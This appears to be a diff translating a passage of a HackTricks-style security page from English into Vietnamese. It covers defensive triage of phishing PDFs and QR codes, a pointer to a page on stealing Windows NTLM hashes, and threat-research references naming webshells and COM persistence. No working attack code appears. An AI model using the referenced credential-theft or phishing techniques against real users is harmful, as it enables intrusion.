-Triage both PDF actions and rendered QR codes. A QR may be vector-drawn rather than stored as an extractable image, so rasterize every page as well as extracting embedded images:
+Phân loại cả các hành động trong PDF lẫn mã QR đã được hiển thị. Mã QR có thể được vẽ dưới dạng vector thay vì lưu dưới dạng hình ảnh có thể trích xuất, vì vậy hãy chuyển đổi từng trang thành ảnh raster, đồng thời trích xuất các hình ảnh được nhúng:
 
 ```bash
 pdfid.py lure.pdf
@@ -393,11 +393,11 @@ pdftoppm -png -r 300 lure.pdf page
 zbarimg --quiet image-*.png page-*.png
 ```
 
-Inspect decoded destinations and redirects from an isolated analysis system without authenticating. Useful hunting features include QR-only PDFs with nearly empty mail bodies, the recipient email embedded in a query parameter, several redirects through reputable hosting, and different content returned according to IP, geolocation, cookies, referrer, or user agent. Compare requests with controlled profiles because a single sandbox fetch can receive only the decoy.<sup>[[10]](#references)</sup>
+Kiểm tra các đích đến đã giải mã và chuỗi redirect từ một hệ thống phân tích cô lập mà không cần xác thực. Các đặc điểm hữu ích để săn tìm gồm PDF chỉ chứa QR với phần nội dung email gần như trống, email người nhận được nhúng trong query parameter, nhiều redirect qua các dịch vụ hosting uy tín và nội dung khác nhau tùy theo IP, vị trí địa lý, cookie, referrer hoặc user agent. So sánh các request bằng những profile được kiểm soát, vì một lần sandbox fetch duy nhất có thể chỉ nhận được nội dung mồi.<sup>[[10]](#references)</sup>
 
-## Windows files to steal NTLM hashes
+## Các tệp Windows dùng để đánh cắp NTLM hashes
 
-Check the page about **places to steal NTLM creds**:
+Xem trang về **những nơi có thể đánh cắp NTLM creds**:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
@@ -408,15 +408,15 @@ Check the page about **places to steal NTLM creds**:
 
 ## References
 
-- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công phishing tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode: Theo dõi tradecraft của Dropping Elephant qua chuỗi loader chủ đề Trung Quốc](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Chiếm quyền TypeLib – Kỹ thuật COM persistence mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI Loader phát tán nhiều loại infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
 - [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
-- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
-- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console for initial access and evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
-- [10] [Microsoft Security Blog – Threat actors leverage tax season to deploy tax-themed phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
-- [11] [Cisco Talos – UAT-11587 delivery chain and Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
+- [8] [MITRE ATT&CK – Thực thi proxy bằng tiện ích dành cho nhà phát triển đáng tin cậy: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
+- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console để initial access và né tránh](https://www.elastic.co/security-labs/threat-command/grimresource)
+- [10] [Microsoft Security Blog – Tác nhân đe dọa lợi dụng mùa khai thuế để triển khai các chiến dịch phishing theo chủ đề thuế](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
+- [11] [Cisco Talos – Chuỗi phát tán UAT-11587 và backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
 {{#include ../../banners/hacktricks-training.md}}
